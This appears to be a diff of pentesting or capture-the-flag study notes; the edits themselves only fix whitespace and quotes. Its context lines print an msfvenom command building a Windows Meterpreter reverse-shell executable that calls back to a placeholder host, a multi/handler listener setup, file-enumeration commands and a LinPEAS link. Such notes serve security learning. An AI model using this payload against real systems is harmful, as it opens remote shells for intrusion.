@@ -1082,7 +1082,7 @@ p10 Create a 64bit Windows Meterpreter shell using msfvenom
 - create shell
 - ``` msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe -o shell.exe LHOST=<tun0-ip> LPORT=4444 ```
 - start a listener
-- 
+
 ``` 
 msfconsole
 use multi/handler
@@ -1117,7 +1117,7 @@ run
 - ``` find / -cmin -60 ``` find files changed in last 60 minutes.
 - ``` find / -size 50M ``` find files with size of 50m.
 - ``` find / -size +100M ``` find files larger than 100m.
-- ``` find / -size +100M -type f 2>/dev/null ``` redirect errors to “/dev/null” and have a cleaner output
+- ``` find / -size +100M -type f 2>/dev/null ``` redirect errors to "/dev/null" and have a cleaner output
 
 **Automated Enumeration Tools**
 - LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
